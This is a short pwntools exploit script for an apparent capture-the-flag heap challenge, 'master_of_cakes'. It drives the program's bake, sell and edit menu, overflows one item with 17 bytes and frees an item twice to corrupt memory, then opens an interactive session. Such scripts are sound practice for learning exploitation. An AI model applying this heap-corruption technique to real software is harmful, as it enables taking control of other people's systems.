# -*- coding: utf-8 -*-
# @Author: m4drat
# @Date:   2019-10-30 19:22:27

from pwn import *

#context(os='linux', arch='i386')
context(os='linux', arch='amd64')

context.terminal = ['tmux', 'new-window']
context.log_level = 2
local = False
fPath  = './master_of_cakes'
taskIp = '127.0.0.1'
taskPort = 22012

if local:
    ps = process(fPath)
else:
    ps = remote(taskIp, taskPort)

def bake(name):
    ps.sendline('b')
    ps.recv()
    ps.sendline(name)
    ps.recv()

def sell(idx):
    ps.sendline('s')
    ps.recv()
    ps.sendline(idx if type(idx) == str else str(idx))
    ps.recv()

def edit(idx, newname):
    ps.sendline('e')
    ps.recv()
    ps.sendline(idx if type(idx) == str else str(idx))
    ps.recv()
    ps.sendline(newname)
    ps.recv()

def main():
    bake('AAAA')
    bake('BBBB')
    sell(0)
    edit(1, 'C' * 17)
    sell(0)

    ps.interactive()

if __name__ == "__main__":
    main()